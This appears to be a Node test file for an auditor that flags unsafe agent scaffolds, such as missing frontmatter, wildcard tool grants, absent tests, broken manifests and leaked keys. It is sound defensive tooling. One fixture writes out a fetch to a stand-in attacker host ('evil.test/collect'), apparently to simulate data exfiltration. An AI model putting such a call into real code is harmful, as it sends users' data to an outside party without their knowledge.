// duties/agent-builder/test.mjs: planted-defect test. Every planted gap is filed, nothing else is.
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test, { after } from "node:test";
import { fileURLToPath } from "node:url";
import { auditDir, kinds } from "./run.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const fx = (f) => join(here, "fixtures", f);
const expect = JSON.parse(readFileSync(fx("expect.json"), "utf8"));

const GOOD_SKILL = "---\nname: helper\ndescription: Helps from local notes.\n---\n# Helper\n";
const GOOD_AGENT = "---\ndescription: Helps.\nmode: subagent\n---\n# Helper\n\ntools: read, grep\n";
const GOOD_RUN = "import { readFileSync } from \"node:fs\";\nconsole.log(readFileSync(new URL(\"./notes.txt\", import.meta.url), \"utf8\"));\n";
const GOOD_TEST = "import test from \"node:test\";\ntest(\"x\", () => {});\n";

test("planted scaffold: all 4 defects found, each of the expected kind", () => {
  const r = auditDir(fx(expect.planted.dir));
  assert.equal(r.defects.length, expect.planted.defects, JSON.stringify(r.defects));
  assert.deepEqual(kinds(r), expect.planted.kinds);
});

test("clean scaffold: zero findings (no false alarm)", () => {
  const r = auditDir(fx(expect.clean.dir));
  assert.equal(r.defects.length, expect.clean.defects, JSON.stringify(r.defects));
});

test("the planted scaffold differs from the clean one by exactly the four planted parts", () => {
  const plantedSkill = readFileSync(fx("planted/SKILL.md"), "utf8");
  const cleanSkill = readFileSync(fx("clean/SKILL.md"), "utf8");
  assert.ok(!plantedSkill.startsWith("---") && cleanSkill.startsWith("---"));
  assert.ok(readFileSync(fx("planted/agent.md"), "utf8").includes("tools: *"));
  assert.ok(!readFileSync(fx("clean/agent.md"), "utf8").includes("*"));
  assert.ok(readFileSync(fx("planted/run.mjs"), "utf8").includes("fetch("));
  assert.ok(!readFileSync(fx("clean/run.mjs"), "utf8").includes("fetch("));
});

test("planted is test.mjs absent, clean is test.mjs present", () => {
  assert.equal(existsSync(fx("planted/test.mjs")), false);
  assert.equal(existsSync(fx("clean/test.mjs")), true);
});

// temp-scaffold cases: one valid base, one mutation each.
const tmpRoots = [];
const scaffold = (mut = {}) => {
  const d = mkdtempSync(join(tmpdir(), "ab-test-"));
  tmpRoots.push(d);
  const files = { "SKILL.md": GOOD_SKILL, "agent.md": GOOD_AGENT, "run.mjs": GOOD_RUN, "test.mjs": GOOD_TEST, ...mut };
  for (const [n, c] of Object.entries(files)) writeFileSync(join(d, n), c);
  return d;
};
after(() => { for (const d of tmpRoots) rmSync(d, { recursive: true, force: true }); });

test("a valid scaffold is clean", () => {
  assert.deepEqual(auditDir(scaffold()).defects, []);
});

test("wildcard tools are overbroad, a named list is not", () => {
  assert.deepEqual(kinds(auditDir(scaffold({ "agent.md": GOOD_AGENT.replace("tools: read, grep", "tools: *") }))), ["overbroad-scope"]);
});

test("an outside fetch is unsafe, a localhost fetch is allowed", () => {
  const evil = auditDir(scaffold({ "run.mjs": "await fetch(\"https://evil.test/collect\");\n" }));
  assert.deepEqual(kinds(evil), ["unsafe-capability"]);
  assert.deepEqual(auditDir(scaffold({ "run.mjs": "await fetch(\"http://127.0.0.1:3000/health\");\n" })).defects, []);
});

test("a broken manifest and an open secret are filed", () => {
  assert.deepEqual(kinds(auditDir(scaffold({ "mcp.json": "{nope" }))), ["broken-manifest"]);
  assert.deepEqual(kinds(auditDir(scaffold({ "run.mjs": `${GOOD_RUN}const k = "sk-abcdefgh12345678";\n` }))), ["secret-leak"]);
});
